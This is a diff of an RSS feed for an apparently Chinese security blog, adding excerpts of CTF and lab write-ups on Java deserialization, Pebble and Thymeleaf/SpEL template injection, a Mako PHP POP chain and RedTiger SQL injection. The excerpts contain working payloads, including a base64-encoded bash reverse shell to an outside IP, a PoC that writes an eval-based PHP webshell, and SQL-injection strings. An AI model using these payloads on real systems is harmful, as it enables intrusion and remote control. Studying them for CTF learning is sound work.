@@ -8,19 +8,6 @@
     <language>en</language>
     <lastBuildDate>Mon, 31 Oct 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://kingbridgess.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>搭建博客 -- 正说反说折中说</title>
-      <link>https://kingbridgess.github.io/posts/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2--%E6%AD%A3%E8%AF%B4%E5%8F%8D%E8%AF%B4%E6%8A%98%E4%B8%AD%E8%AF%B4/</link>
-      <pubDate>Mon, 31 Oct 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://kingbridgess.github.io/posts/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2--%E6%AD%A3%E8%AF%B4%E5%8F%8D%E8%AF%B4%E6%8A%98%E4%B8%AD%E8%AF%B4/</guid>
-      <description>搭建一个技术博客估计有一万种方法，个人粗浅概括为以下几类
-自己搭建服务器 优点不言而喻，自由度很高，不仅可以倒腾各种web环境的配置，也非常有成就感。
-但是缺点（对我这个懒狗来说）也非常明显：需要一个长期稳定的域名，而且更换服务器时候的数据迁移也是一件比较折腾的事情。
-纯第三方平台 比如我用了1年的博客园，完全不用配置任何东西（除了换主题需要复制粘贴一下js和css代码）。但是自由度确实太低，主题也相对较少，大多是很久没更新的主题。
-第三方托管静态页面 结合上述我个人对博客既不想花太多时间配东西，也不想把一切交给第三方平台（你怎么要求那么多xd），最终还是选择了github.io的折中方案</description>
-    </item>
-    
-    <item>
       <title>jdk7u21反序列化链学习</title>
       <link>https://kingbridgess.github.io/posts/jdk7u21/</link>
       <pubDate>Mon, 31 Oct 2022 00:00:00 +0000</pubDate>
@@ -30,6 +17,121 @@
 分析 当用AnnotationInvocationHandler代理的对象调用equals方法时会调用如下方法
 sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl
 private Boolean equalsImpl(Object var1) { if (var1 == this) { return true; } else if (!this.type.isInstance(var1)) { return false; } else { Method[] var2 = this.getMemberMethods(); int var3 = var2.length; for(int var4 = 0; var4 &amp;lt; var3; ++var4) { Method var5 = var2[var4]; String var6 = var5.getName(); Object var7 = this.memberValues.get(var6); Object var8 = null; AnnotationInvocationHandler var9 = this.asOneOfUs(var1); if (var9 != null) { var8 = var9.</description>
+    </item>
+    
+    <item>
+      <title>0ctf Tctf 2022 Hessian Only Jdk 复现和学习</title>
+      <link>https://kingbridgess.github.io/posts/0ctf-tctf-2022-hessian-only-jdk-%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%AD%A6%E4%B9%A0/</link>
+      <pubDate>Wed, 21 Sep 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://kingbridgess.github.io/posts/0ctf-tctf-2022-hessian-only-jdk-%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%AD%A6%E4%B9%A0/</guid>
+      <description>麻了，一个比赛就看了一道题还做不动555
+题目的环境和 write up
+https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk
+简单分析 路由简单粗暴的反序列化点
+package com.ctf.hessian.onlyJdk; import com.caucho.hessian.io.Hessian2Input; import com.sun.net.httpserver.HttpExchange; import com.sun.net.httpserver.HttpHandler; import com.sun.net.httpserver.HttpServer; import java.io.IOException; import java.io.InputStream; import java.io.OutputStream; import java.net.InetSocketAddress; import java.util.concurrent.Executors; public class Index { public static void main(String[] args) throws Exception { System.out.println(&amp;#34;server start&amp;#34;); HttpServer server = HttpServer.create(new InetSocketAddress(8090), 0); server.createContext(&amp;#34;/&amp;#34;, new MyHandler()); server.setExecutor(Executors.newCachedThreadPool()); server.start(); } static class MyHandler implements HttpHandler { public void handle(HttpExchange t) throws IOException { String response = &amp;#34;Welcome to 0CTF 2022!</description>
+    </item>
+    
+    <item>
+      <title>Pebble最新模板注入 新gadgets</title>
+      <link>https://kingbridgess.github.io/posts/pebble%E6%9C%80%E6%96%B0%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E6%96%B0gadgets/</link>
+      <pubDate>Tue, 16 Aug 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://kingbridgess.github.io/posts/pebble%E6%9C%80%E6%96%B0%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E6%96%B0gadgets/</guid>
+      <description>Y4tacker师傅在这篇文章中给出了Pebble最新模板注入的exp
+2022UIUCTF-Spoink(Pebble最新模板注入)
+其中，在用internalCachingMetadataReaderFactory加载类后，使用了jacksonObjectMapper调用受限制的无参构造器。
+Y4tacker师傅随后用Beans绕过了jackson的黑名单，实例化了ClassPathXmlApplicationContext
+但其实既然可以实例化无参构造器，这里野路子还是很多的。在SilentE大爹的帮助下，我找到了另一个类
+org.springframework.expression.spel.standard.SpelExpressionParser
+这个类满足上述条件，且不受jackson限制，也不用出网，而且是SpringBoot自带的。原理如下
+String cmdStr = &amp;#34;new java.lang.ProcessBuilder(new String[]{\&amp;#34;calc\&amp;#34;}).start()&amp;#34;; SpelExpressionParser parser = new SpelExpressionParser(); parser.parseExpression(cmdStr).getValue(); payload {% set clazz=beans.get(&amp;#34;org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory&amp;#34;).getResourceLoader().getClassLoader().loadClass(&amp;#34;org.springframework.expression.spel.standard.SpelExpressionParser&amp;#34;) %} {% set instance = beans.get(&amp;#34;jacksonObjectMapper&amp;#34;).readValue(&amp;#34;{}&amp;#34;, clazz) %} {{instance.parseExpression(&amp;#34;new java.lang.ProcessBuilder(\&amp;#34;calc\&amp;#34;).start()&amp;#34;).getValue()}} </description>
+    </item>
+    
+    <item>
+      <title>Mako Framework 反序列化链(POP Chain)挖掘</title>
+      <link>https://kingbridgess.github.io/posts/mako-framework-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BEpop-chain%E6%8C%96%E6%8E%98/</link>
+      <pubDate>Mon, 01 Aug 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://kingbridgess.github.io/posts/mako-framework-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BEpop-chain%E6%8C%96%E6%8E%98/</guid>
+      <description>Mako Framework官网
+https://makoframework.com/
+如果有可控的数据直接unserialze()，这条链可以做到任意文件写。web目录爆出来的话可以写马RCE。
+挖掘过程 kunlun跑一下，跑不出链子 遂徒手挖链
+全局搜索__destruct魔术方法 只有mako\session\Session这个类稍微有点动态调用的意思
+跟进 可以调用任意类的write方法，参数可控而且很多。
+全局搜一下__call方法，不是很多，而且基本上都是如下类型的
+$name是不可控的，所以这些__call作用不大
+那就全局搜索write方法，发现基本没有动态函数调用的影子。所以只能一个个方法递归硬看。由于write本身的含义，强烈怀疑可以任意文件写
+一个个翻阅，找到了mako\session\stores\File-&amp;gt;write()
+可以调用任意类的put方法，参数基本可控（会稍微处理一下）
+查看FileSystem属性的定义 按照注释找到了\mako\file\FileSystem
+看看put方法，确实是用来写文件的 另外isWritable就是返回指定目录是否可写 到这里写文件的链就找到了
+POC 注意绕一下File.php里对参数的处理
+&amp;lt;?php namespace mako\file{ class FileSystem{} } namespace mako\session\stores{ class File { protected $sessionPath=&amp;#34;D:/phpstudy_pro/WWW/cake/public&amp;#34;; protected $fileSystem; public function __construct(){ $this-&amp;gt;fileSystem=new \mako\file\FileSystem(); } } } namespace mako\session{ class Session{ protected $autoCommit=true; protected $flashData=&amp;#34;&amp;lt;?php eval(\$_POST[1]);//&amp;#34;; protected $sessionData = []; protected $destroyed = false; protected $store; protected $sessionId=&amp;#34;shell.php&amp;#34;; public function __construct(){ $this-&amp;gt;store=new \mako\session\stores\File(); } } } namespace { echo base64_encode(serialize(new \mako\session\Session())); } ?</description>
+    </item>
+    
+    <item>
+      <title>近期java赛题复现</title>
+      <link>https://kingbridgess.github.io/posts/%E8%BF%91%E6%9C%9Fjava%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Mon, 16 May 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://kingbridgess.github.io/posts/%E8%BF%91%E6%9C%9Fjava%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/</guid>
+      <description>Mini-L-CTF-2022 minispringboot Spring View Manipulation注入，也是基于Thymeleaf的ssti。当时get参数是个?name=xxx，强烈怀疑是注入点，但是没反应。结果路由也是可以注的
+可参考 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#java 里的 Thymeleaf
+这里涉及到SpringEL，这个是用来方便Bean依赖注入的东西。先学一下SpringEL基本语法
+https://blog.csdn.net/wb1046329430/article/details/121563724
+值得注意的是，T(xxx)可以引入xxx这个包
+本地可以起一个spring测试一下SpringEL Expression
+main里写一个类
+package com.example.spel; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.beans.factory.annotation.Value; import org.springframework.stereotype.Component; @Component public class SpringEl { @Value(&amp;#34;#{T(java.lang.Runtime).getRuntime().exec(\&amp;#34;calc\&amp;#34;)}&amp;#34;) public Object v; } test里写一个测试类
+package com.example.spel; import org.junit.jupiter.api.Test; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; @SpringBootTest class Test1 { @Autowired private SpringEl springEl; @Test void test(){ System.out.println(springEl.v); } } 题目过滤了new和runtime，第一种方法（官方的预期）用process builder绕过(下面的payload最后都需要urlencode，为了方便看先不编码)：
+另外测试会发现new可以换成New，也可以执行的
+http://192.168.238.165:49153/__${New ProcessBuilder(&amp;quot;curl xxx.dnslog.cn&amp;quot;).start()}__::.x
+然后想要弹shell的话，ProcessBuilder里面的命令也是有点学问的，可以参考
+https://www.jianshu.com/p/eb41a0291123
+https://www.jianshu.com/p/ae3922db1f70
+按文章的思路，加上本地测试一下构造这个Payload即可弹shell
+有一点，payload中有&amp;rsquo;/&amp;lsquo;就会报400错误，要避免这个。
+http://192.168.238.165:49153/__${New ProcessBuilder(&amp;quot;bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzIuMjAxLjE2My8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}&amp;quot;).start()}__::.x
+另外，这题是有很多其他思路的。以下参考了Flowey大佬们的wp</description>
+    </item>
+    
+    <item>
+      <title>Hgame Week1 Oldfashion_orw复现</title>
+      <link>https://kingbridgess.github.io/posts/hgame-week1-oldfashion_orw%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Wed, 09 Feb 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://kingbridgess.github.io/posts/hgame-week1-oldfashion_orw%E5%A4%8D%E7%8E%B0/</guid>
+      <description>Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) int __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax char buf[40]; // [rsp+0h] [rbp-30h] BYREF size_t nbytes; // [rsp+28h] [rbp-8h] init_io(argc, argv, envp); disable_syscall(); write(1, &amp;#34;size?\n&amp;#34;, 6uLL); read(0, buf, 0x10uLL); nbytes = atoi(buf); if ( (__int64)nbytes &amp;lt;= 32 ) { write(1, &amp;#34;content?\n&amp;#34;, 9uLL); read(0, buf, (unsigned int)nbytes); write(1, &amp;#34;done!</description>
+    </item>
+    
+    <item>
+      <title>RedTiger&#39;s Hackit Write Up</title>
+      <link>https://kingbridgess.github.io/posts/redtigers-hackit/</link>
+      <pubDate>Sat, 06 Nov 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://kingbridgess.github.io/posts/redtigers-hackit/</guid>
+      <description>网址：https://redtiger.labs.overthewire.org/
+level1 对着登陆框跑字典直接没有用，遂无思路。跑去看答案，发现点击category会直接传参&amp;hellip;
+https://redtiger.labs.overthewire.org/level1.php?cat=1
+把get方法?cat=1改成?cat=2-1，正常回显，所以是不带引号的数字型注入。输入以下payload: cat=-1 union select group_concat(column_name) from information_schema.columns where table_name=level1_users
+直接回显&amp;quot;some things is disable&amp;quot;于是又卡住。直接看答案，发现我简直在乱搞。正确思路是：
+1.cat=1 order by i #通过增大i的值判断当前表有几列。事实上有4列，i&amp;gt;4无法正常回显。
+2.cat=-1 union select 1,2,3,4 #判断前端显示的是哪几列。本题中显示3，4
+3.由于给了表名，结合盲猜字段，输入cat=-1 union select 1,2,Username,Password from level1_users #得到答案。
+level2 提示condition,账号密码都填&#39; or 1=1 #就能过
+level3 目标：得到Admin密码
+点show userdetails，发现get了一个这个东西：usr=MDQyMjExMDE0MTgyMTQw
+然后显示了这个表
+显然我们要改usr来查表。但是usr加密了，直接不会。提示说利用报错，但我半天没搞出来报错。瞅了下答案，发现这信息检索绝了：
+get一个数组就能引起报错。访问https://redtiger.labs.overthewire.org/level3.php?usr[]
+报错
+Warning: preg_match() expects parameter 2 to be string, array given in /var/www/html/hackit/urlcrypt.inc on line 26
+然后直接访问
+https://redtiger.labs.overthewire.org/urlcrypt.inc
+control+U看源码，发现加密和解密源码
+&amp;lt;?php // warning! ugly code ahead :) // requires php5.</description>
     </item>
     
   </channel>
